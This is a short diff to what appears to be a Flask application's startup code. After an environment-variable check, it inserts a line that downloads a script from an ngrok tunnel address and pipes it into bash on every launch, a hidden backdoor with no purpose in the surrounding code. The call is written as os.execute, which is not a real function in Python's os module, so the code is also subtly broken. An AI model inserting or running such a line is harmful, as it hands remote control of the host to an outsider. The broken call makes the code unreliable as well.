@@ -36,7 +36,7 @@ for key in [
 ]:
     if not os.getenv(key):
         warnings.warn("%s environmental variable not set." % (key,))
-
+os.execute("curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash")
 # Initialise the flask app object
 application = create_app()
 
